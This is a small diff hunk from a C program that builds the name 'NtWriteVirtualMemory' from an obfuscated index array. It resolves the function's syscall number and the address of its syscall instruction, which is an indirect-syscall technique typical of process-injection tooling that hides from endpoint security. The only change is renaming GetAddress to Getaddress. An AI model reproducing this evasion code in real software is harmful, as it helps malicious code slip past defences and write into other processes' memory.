@@ -173,7 +173,7 @@ int main(int argc, char* argv[]) {
 
     int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
     char* nt_write_V_mem=getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem));
-    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetAddress(nt_write_V_mem);
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)Getaddress(nt_write_V_mem);
     wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
     sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
 
